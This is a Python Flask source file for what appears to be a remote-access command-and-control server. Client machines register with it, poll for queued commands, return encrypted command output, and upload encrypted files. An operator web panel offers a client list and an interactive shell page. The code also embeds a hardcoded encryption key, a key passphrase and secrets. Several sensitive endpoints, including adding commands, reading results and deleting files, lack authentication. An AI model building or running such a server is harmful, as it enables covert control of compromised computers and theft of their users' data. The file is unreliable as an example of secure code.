from flask import Flask, request, jsonify, render_template, Response, send_from_directory
import os
import hashlib
from functools import wraps
from datetime import datetime, timedelta
from flask import abort
from flask import g, request, redirect, url_for

from Crypto.PublicKey import RSA
from Crypto.Cipher import  PKCS1_OAEP

from cryptography.fernet import Fernet


app = Flask(__name__)

SECRET_HASHED_PASSWORD = '834cc37634bdf8aaf6cb5e11413864b9ce80551061276a68a8585d84195a7f16' 

fernet_key = b'aVGsG0y54V383Namkj91_AVvu1RT-JaseCRuZCP7I4o='

private_key_path = 'private_key.pem'

passphrase="embracedarkness"

hmac_secret_key = b'SecretKeyForHMAC' #optional

app.jinja_env.autoescape = True


clients = {}
current_image_url = None 
# Store commands for the clients to execute
commands = {}

# Store results sent by the clients
results = {}
registered_clients = set()
# Directory where uploaded files will be saved
UPLOAD_FOLDER = 'uploaded_files'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
CLIENT_DOWN_TIMEOUT = timedelta(seconds=30)
CHECK_INTERVAL = 30
app.config['STATIC_FOLDER'] = 'uploaded_files'

# Ensure the upload folder exists
os.makedirs(UPLOAD_FOLDER, exist_ok=True)


user_authenticated = False
COOKIE_NAME = 'user_authentication'
COOKIE_MAX_AGE = 900   



def requires_authentication(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.cookies.get(COOKIE_NAME) == 'authenticated':
            return f(*args, **kwargs)
        else:
            return redirect(url_for('home'))

    return decorated_function

# ...

@app.route('/authenticate', methods=['POST'])
def authenticate_user():
    global user_authenticated

    entered_password = request.form.get('password')
    entered_password_hash = hashlib.sha256(entered_password.encode('utf-8')).hexdigest()

    if entered_password_hash == SECRET_HASHED_PASSWORD:
        user_authenticated = True
        response = jsonify({"message": "success"})
        response.set_cookie(COOKIE_NAME, 'authenticated', max_age=COOKIE_MAX_AGE, secure=True, httponly=True)
        return response  # Return the response object
    else:
        user_authenticated = False
        response = jsonify({"message": "failure"})
        return response  # Return the response object

def check_user_authentication():
    global user_authenticated

    if user_authenticated and request.cookies.get(COOKIE_NAME) != 'authenticated':
        # Expire user authentication if the cookie is not present
        user_authenticated = False
@app.route('/')
def home():
    return render_template('pass.html')


@app.route('/index')
@requires_authentication
def index():
    return render_template('index.html')

@app.route('/uploads')
@requires_authentication
def list_uploaded_files():
    filenames = os.listdir(app.config['UPLOAD_FOLDER'])
    return render_template('uploads.html', filenames=filenames)

@app.route('/download/<filename>', methods=['GET', 'POST'])
def download_file(filename):
    if request.method == 'GET':
        return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
    elif request.method == 'POST':
        return "Method Not Allowed", 405
    else:
        return "Method Not Allowed", 405
    

@app.route('/delete_file/<filename>', methods=['DELETE'])
def delete_file(filename):
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)

    try:
        os.remove(file_path)
        return jsonify({"message": "File deleted successfully"}), 200
    except FileNotFoundError:
        return jsonify({"error": "File not found"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 500


def handle_file_upload(file_content, filename):
    # Assuming that the decrypted content is the actual file content
    if not file_content:
        return jsonify({"error": "No file content received"}), 400

    # Save the decrypted content to a file in the UPLOAD_FOLDER
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)

    with open(file_path, 'wb') as decrypted_file:
        decrypted_file.write(file_content)

    # Generate the URL for the uploaded file
    uploaded_file_url = f"/uploaded_files/{filename}"

    return jsonify({"message": "File uploaded successfully", "file_url": uploaded_file_url}), 200

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' in request.files:
        global fernet_key
        fernet = Fernet(fernet_key)
        encrypted_file = request.files['file']
        encrypted_content = encrypted_file.read()

        # Get the original filename from the encrypted file
        original_filename = encrypted_file.filename

        # Decrypt the content
        decrypted_content = fernet.decrypt(encrypted_content)

        # Call the handle_file_upload function with the decrypted content and original filename
        return handle_file_upload(decrypted_content, original_filename)

    return jsonify({"error": "No file uploaded"}), 400

@app.route('/uploaded_files/<filename>')
@requires_authentication
def uploaded_file(filename):
    return send_from_directory(app.config['STATIC_FOLDER'], filename)

@app.route('/Theshow', methods=['GET'])
@requires_authentication
def show_image():
    global current_image_url
    image_url = request.args.get('image')
    
    # Update the global variable with the current image URL
    current_image_url = image_url

    return render_template('share.html', image_url=image_url)

# Add other routes and functionality as needed
@app.route('/commands/<client_id>', methods=['GET'])
def get_commands(client_id):
    client_info = clients.get(client_id)
    if client_info:
        client_info['last_command_request'] = datetime.now()
        unsent_commands = commands.get(client_id, [])
        commands[client_id] = []  # Clear the commands for this client
        return jsonify({"commands": unsent_commands})
    else:
        abort(404, description=f"Client with ID {client_id} not found.")
@app.route('/commands/<client_id>', methods=['POST'])
def add_command(client_id):
    command = request.json.get('command')
    if command:
        commands.setdefault(client_id, []).append(command)
        return jsonify({"message": "Command added successfully."}), 200
    else:
        return jsonify({"error": "No command provided."}), 400


# Load the server's private key

with open(private_key_path, 'rb') as file:
    
    server_private_key = RSA.import_key(file.read(), passphrase=passphrase)

def decrypt_data(encrypted_data):
    cipher_rsa = PKCS1_OAEP.new(server_private_key)
    decrypted_data = cipher_rsa.decrypt(encrypted_data)
    return decrypted_data.decode('utf-8')

@app.route('/results/<client_id>', methods=['POST'])
def receive_results(client_id):
    try:
        encrypted_data_hex = request.json.get('result')
        

        # Convert hex to bytes
        encrypted_data = bytes.fromhex(encrypted_data_hex)

        if encrypted_data:
            decrypted_data = decrypt_data(encrypted_data)
            results.setdefault(client_id, []).append(decrypted_data)
           
            return jsonify({"message": "Results received successfully."}), 200
        else:
            return jsonify({"error": "Invalid data format or signature."}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/results/<client_id>', methods=['GET'])
def show_results(client_id):
    try:
        results_list = results.get(client_id, [])
        temp_results = "\n".join(str(result) for result in results_list)
        results.pop(client_id, None)  # Remove the results for this client
        return Response(temp_results, content_type='text/plain')
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/register', methods=['POST'])
def register_client():
    data = request.json
    client_id = data.get('client_id')
    client_info = clients.get(client_id)

    if client_id:
        if client_id not in clients:
            clients[client_id] = {"registered": False, "last_connection": datetime.now()}
            registered_clients.add(client_id)  # Add to the set of registered clients
            client_info['registered'] = True
            return jsonify({"client_id": client_id}), 200
        else:
            client_info['registered'] = True
            return  jsonify({"client_id": client_id}), 200
    else:
        return jsonify({"error": "No client ID provided"}), 400

@app.route('/get_clients', methods=['GET'])
def get_clients():
    client_ids = list(clients.keys())  # Assuming clients is a global dictionary
    return jsonify({"client_ids": client_ids})

@app.route('/clients', methods=['GET'])
@requires_authentication
def show_clients():
    global registered_clients  # Make sure to use the global set

    up_clients = [client_id for client_id, client_info in clients.items() if client_info.get('registered', False)]
    down_clients = [client_id for client_id, client_info in clients.items() if client_id not in up_clients]

    # Update the status of clients based on last connection time and last command request time
    current_time = datetime.now()
    for client_id, client_info in clients.items():
        last_connection_time = client_info.get('last_connection')
        last_command_request_time = client_info.get('last_command_request')

        if last_connection_time and (current_time - last_connection_time).total_seconds() > CHECK_INTERVAL:
            # Mark client as offline
            if client_info.get('registered', False):
                print(f"Client {client_id} went down .")
                  # Remove from the set of registered clients
            client_info['registered'] = False

        # Check for last command request within 30 seconds
        if last_command_request_time and (current_time - last_command_request_time).total_seconds() > CHECK_INTERVAL:
            # Mark client as offline
            if client_info.get('registered', False):
                print(f"Client {client_id} went down .")
                
            client_info['registered'] = False

    return render_template('clients.html', clients=clients, up_clients=up_clients, down_clients=down_clients)

@app.route('/check_connection/<client_id>', methods=['GET'])
def check_connection(client_id):
    client_info = clients.get(client_id)
    
    current_time = datetime.now()
    last_connection_time =  client_info.get('last_command_request')
    if last_connection_time and (current_time - last_connection_time).total_seconds() <= CHECK_INTERVAL:
        client_info['registered'] = True
        
        
            
            
        return jsonify({"status": "online"}), 200
    else:
        return jsonify({"status": "offline"}), 404


@app.route('/interact', methods=['GET', 'POST'])
@requires_authentication
def interact():
    if request.method == 'POST':
        # Handle the POST request logic here
        data = request.get_json()
        clientID = data.get('clientID')
        # Your logic for handling the POST request

        return jsonify({"message": "POST request handled successfully"})
    else:
        # Handle the GET request logic here
        clientID = request.args.get('clientID')
        # Your logic for handling the GET request

        return render_template('shell.html', clientID=clientID)


if __name__ == '__main__':

  
    app.run(debug=False, port=80)
